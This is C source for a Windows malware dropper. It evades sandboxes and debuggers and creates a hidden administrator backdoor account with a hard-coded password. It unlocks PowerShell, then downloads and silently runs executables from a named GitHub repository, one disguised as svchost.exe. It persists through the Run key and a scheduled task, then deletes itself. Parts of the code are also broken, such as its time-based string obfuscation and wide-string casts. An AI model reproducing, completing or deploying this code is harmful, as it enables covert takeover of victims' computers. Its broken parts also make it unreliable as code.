#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <sddl.h>
#include <wininet.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// Function prototypes
unsigned char* ObfuscateString(const char* input, size_t len, DWORD key);
char* Deobfuscate(const unsigned char* input, size_t len, DWORD key);
void AntiSandbox();
void ElevatePrivileges();
BOOL IsAdmin();
void CreateBackdoorAccount();
void DisablePowerShellRestrictions();
void DownloadFile(const char* url, const char* savePath);
void DownloadAndExecutePayloads();
void AddToStartup(const char* appName, const char* appPath);
void EstablishPersistence();
void SelfDestruct();
BOOL IsDebugged();

// Custom implementations of CRT functions
#define strcpy(dest, src) lstrcpyA(dest, src)
#define strcat(dest, src) lstrcatA(dest, src)
#define strlen(str) lstrlenA(str)
#define malloc(size) HeapAlloc(GetProcessHeap(), 0, size)
#define free(ptr) HeapFree(GetProcessHeap(), 0, ptr)

// Simple LCG random number generator
static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

// Polymorphic XOR obfuscation with rotating keys
#define OBF_KEY (0x55AAFF00 ^ (GetTickCount() & 0xFFFF))
#define OBFUSCATE(str) (const char*)ObfuscateString(str, sizeof(str), OBF_KEY)

// Anti-debugging technique
BOOL IsDebugged() {
    return IsDebuggerPresent();
}

unsigned char* ObfuscateString(const char* input, size_t len, DWORD key) {
    unsigned char* obf = (unsigned char*)malloc(len);
    for(size_t i = 0; i < len; i++) {
        obf[i] = input[i] ^ ((key >> (i % 24)) & 0xFF);
    }
    return obf;
}

char* Deobfuscate(const unsigned char* input, size_t len, DWORD key) {
    char* deob = (char*)malloc(len);
    for(size_t i = 0; i < len; i++) {
        deob[i] = input[i] ^ ((key >> (i % 24)) & 0xFF);
    }
    return deob;
}

void AntiSandbox() {
    if(GetTickCount() < 180000)  // Exit if in sandbox
        ExitProcess(0);
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if(sysInfo.dwNumberOfProcessors < 2)  // VM check
        ExitProcess(0);
        
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if(mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))  // Less than 2GB RAM
        ExitProcess(0);
}

void ElevatePrivileges() {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = "cmd.exe";
    sei.nShow = SW_HIDE;
    
    // Polymorphic argument construction
    char params[512];
    const char* part1 = Deobfuscate(OBFUSCATE("\" /c \""), 7, OBF_KEY);
    const char* part2 = Deobfuscate(OBFUSCATE(" HIDDEN\""), 9, OBF_KEY);
    lstrcpyA(params, part1);
    lstrcatA(params, selfPath);
    lstrcatA(params, part2);
    free((void*)part1);
    free((void*)part2);
    
    sei.lpParameters = params;
    ShellExecuteExA(&sei);
    ExitProcess(0);
}

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if(AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void CreateBackdoorAccount() {
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    LOCALGROUP_MEMBERS_INFO_3 account;
    
    // Obfuscated credentials
    const char* username = Deobfuscate(OBFUSCATE("TBuG"), 4, OBF_KEY);
    const char* password = Deobfuscate(OBFUSCATE("P@ssw0rd123!"), 13, OBF_KEY);
    
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    ui.usri1_script_path = NULL;
    
    NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
    
    // Add to administrators
    account.lgrmi3_domainandname = (LPWSTR)username;
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    
    free((void*)username);
    free((void*)password);
}

void DisablePowerShellRestrictions() {
    HKEY hKey;
    const char* subkey = Deobfuscate(OBFUSCATE("SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell"), 63, OBF_KEY);
    const char* value = Deobfuscate(OBFUSCATE("ExecutionPolicy"), 17, OBF_KEY);
    const char* data = Deobfuscate(OBFUSCATE("Unrestricted"), 12, OBF_KEY);
    
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD dataLen = lstrlenA(data) + 1;
    RegSetValueExA(hKey, value, 0, REG_SZ, (const BYTE*)data, dataLen);
    RegCloseKey(hKey);
    
    free((void*)subkey);
    free((void*)value);
    free((void*)data);
}

void DownloadFile(const char* url, const char* savePath) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (hUrl) {
            HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                BYTE buffer[4096];
                DWORD bytesRead, bytesWritten;
                while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
                    WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
                }
                CloseHandle(hFile);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }
}

void DownloadAndExecutePayloads() {
    char appDataPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
    
    // Get Templates directory path
    char templatesDir[MAX_PATH];
    lstrcpyA(templatesDir, appDataPath);
    lstrcatA(templatesDir, "\\Microsoft\\Windows\\Templates");
    
    // Create mall directory explicitly
    char mallDir[MAX_PATH];
    lstrcpyA(mallDir, templatesDir);
    lstrcatA(mallDir, "\\mall");
    CreateDirectoryA(mallDir, NULL);
    SetFileAttributesA(mallDir, FILE_ATTRIBUTE_HIDDEN);
    
    // Download mall.zip to Templates directory
    const char* domain = Deobfuscate(OBFUSCATE("github.com"), 11, OBF_KEY);
    const char* path = Deobfuscate(OBFUSCATE("/Drakovthe6th/TBuG/raw/master/mall.zip"), 40, OBF_KEY);
    char mallUrl[256];
    lstrcpyA(mallUrl, "https://");
    lstrcatA(mallUrl, domain);
    lstrcatA(mallUrl, path);
    
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, templatesDir);
    lstrcatA(zipPath, "\\mall.zip");
    
    // Download mall.zip
    DownloadFile(mallUrl, zipPath);
    
    // Use PowerShell for reliable extraction to mall directory
    char psCmd[512];
    wsprintfA(psCmd, 
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        mallDir  // Extract directly to mall directory
    );
    
    // Execute PowerShell extraction hidden
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmdLine[512];
    lstrcpyA(cmdLine, "cmd.exe /c ");
    lstrcatA(cmdLine, psCmd);
    
    CreateProcessA(
        NULL,                   // lpApplicationName
        cmdLine,                // lpCommandLine
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        FALSE,                  // bInheritHandles
        CREATE_NO_WINDOW,       // dwCreationFlags
        NULL,                   // lpEnvironment
        NULL,                   // lpCurrentDirectory
        &si,                    // lpStartupInfo
        &pi                     // lpProcessInformation
    );
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Execute Edge.exe and SystemHelper.exe from mall directory
    char edgePath[MAX_PATH], helperPath[MAX_PATH];
    lstrcpyA(edgePath, mallDir);
    lstrcatA(edgePath, "\\Egde.exe");
    
    lstrcpyA(helperPath, mallDir);
    lstrcatA(helperPath, "\\SystemHelper.exe");
    
    // Run executables hidden
    STARTUPINFOA execSi = { sizeof(execSi) };
    PROCESS_INFORMATION execPi;
    
    CreateProcessA(
        edgePath,               // lpApplicationName
        NULL,                   // lpCommandLine
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        FALSE,                  // bInheritHandles
        CREATE_NO_WINDOW,       // dwCreationFlags
        NULL,                   // lpEnvironment
        mallDir,                // lpCurrentDirectory
        &execSi,                // lpStartupInfo
        &execPi                 // lpProcessInformation
    );
    
    CreateProcessA(
        helperPath,             // lpApplicationName
        NULL,                   // lpCommandLine
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        FALSE,                  // bInheritHandles
        CREATE_NO_WINDOW,       // dwCreationFlags
        NULL,                   // lpEnvironment
        mallDir,                // lpCurrentDirectory
        &execSi,                // lpStartupInfo
        &execPi                 // lpProcessInformation
    );
    
    CloseHandle(execPi.hProcess);
    CloseHandle(execPi.hThread);
    
    // Download hanger.exe as svchost.exe to Templates directory
    const char* hangerUrl = Deobfuscate(OBFUSCATE("https://github.com/Drakovthe6th/TBuG/raw/master/hanger.exe"), 55, OBF_KEY);
    char svchostPath[MAX_PATH];
    lstrcpyA(svchostPath, templatesDir);
    lstrcatA(svchostPath, "\\svchost.exe");
    
    // Download and execute
    DownloadFile(hangerUrl, svchostPath);
    SetFileAttributesA(svchostPath, FILE_ATTRIBUTE_HIDDEN);
    CreateProcessA(
        svchostPath,            // lpApplicationName
        NULL,                   // lpCommandLine
        NULL,                   // lpProcessAttributes
        NULL,                   // lpThreadAttributes
        FALSE,                  // bInheritHandles
        CREATE_NO_WINDOW,       // dwCreationFlags
        NULL,                   // lpEnvironment
        NULL,                   // lpCurrentDirectory
        &execSi,                // lpStartupInfo
        &execPi                 // lpProcessInformation
    );
    
    // Cleanup zip file
    DeleteFileA(zipPath);
    
    // Cleanup memory
    free((void*)domain);
    free((void*)path);
    free((void*)hangerUrl);
}

void AddToStartup(const char* appName, const char* appPath) {
    // Registry persistence
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    DWORD pathLen = lstrlenA(appPath) + 1;
    RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
    RegCloseKey(hKey);
    
    // Scheduled task
    char cmd[512];
    lstrcpyA(cmd, "schtasks /create /tn \"");
    lstrcatA(cmd, appName);
    lstrcatA(cmd, "\" /tr \"\"");
    lstrcatA(cmd, appPath);
    lstrcatA(cmd, "\"\" /sc onlogon /ru SYSTEM /f");
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Wait for process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void EstablishPersistence() {
    char appDataPath[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH);
    
    // Add svchost.exe to startup
    char svchostPath[MAX_PATH];
    lstrcpyA(svchostPath, appDataPath);
    lstrcatA(svchostPath, "\\Microsoft\\Windows\\Templates\\svchost.exe");
    
    const char* startupName = Deobfuscate(OBFUSCATE("WindowsHostService"), 18, OBF_KEY);
    AddToStartup(startupName, svchostPath);
    free((void*)startupName);
    
    // Junk encryption to waste analysis time
    BYTE junk[1024];
    DWORD junkKey = GetTickCount();
    for(int i = 0; i < 5000; i++) {
        for(int j = 0; j < sizeof(junk); j++) {
            junk[j] = (junk[j] ^ (junkKey & 0xFF)) + j;
        }
        junkKey = junkKey * 0x343FD + 0x269EC3;
    }
}

void SelfDestruct() {
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    lstrcatA(batchPath, "\\sysclean.bat");
    
    HANDLE hFile = CreateFileA(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(hFile != INVALID_HANDLE_VALUE) {
        char selfPath[MAX_PATH];
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        
        DWORD bytesWritten;
        char fmt[] = "@echo off\r\n:loop\r\ndel \"%s\" >nul 2>&1\r\nif exist \"%s\" goto loop\r\ndel \"%%~f0\"\r\n";
        int bufSize = lstrlenA(fmt) + 2*lstrlenA(selfPath) + 1;
        char* cmd = (char*)malloc(bufSize);
        if (cmd) {
            wsprintfA(cmd, fmt, selfPath, selfPath);
            WriteFile(hFile, cmd, lstrlenA(cmd), &bytesWritten, NULL);
            free(cmd);
        }
        CloseHandle(hFile);
        
        // Execute batch
        ShellExecuteA(NULL, "open", batchPath, NULL, NULL, SW_HIDE);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if(IsDebugged()) return 0;
    
    AntiSandbox();
    
    if(!IsAdmin()) {
        ElevatePrivileges();
    }
    
    // Initialize random seed
    my_srand(GetTickCount());
    
    // Polymorphic execution flow
    int r = my_rand() % 5;
    switch(r) {
        case 0:
            CreateBackdoorAccount();
            DisablePowerShellRestrictions();
            DownloadAndExecutePayloads();
            EstablishPersistence();
            break;
        case 1:
            DownloadAndExecutePayloads();
            EstablishPersistence();
            CreateBackdoorAccount();
            DisablePowerShellRestrictions();
            break;
        case 2:
            DisablePowerShellRestrictions();
            CreateBackdoorAccount();
            DownloadAndExecutePayloads();
            EstablishPersistence();
            break;
        case 3:
            EstablishPersistence();
            DownloadAndExecutePayloads();
            DisablePowerShellRestrictions();
            CreateBackdoorAccount();
            break;
        default:
            DownloadAndExecutePayloads();
            CreateBackdoorAccount();
            DisablePowerShellRestrictions();
            EstablishPersistence();
    }
    
    // Add delay before self-destruction
    Sleep(30000 + (my_rand() % 15000));
    SelfDestruct();
    
    return 0;
}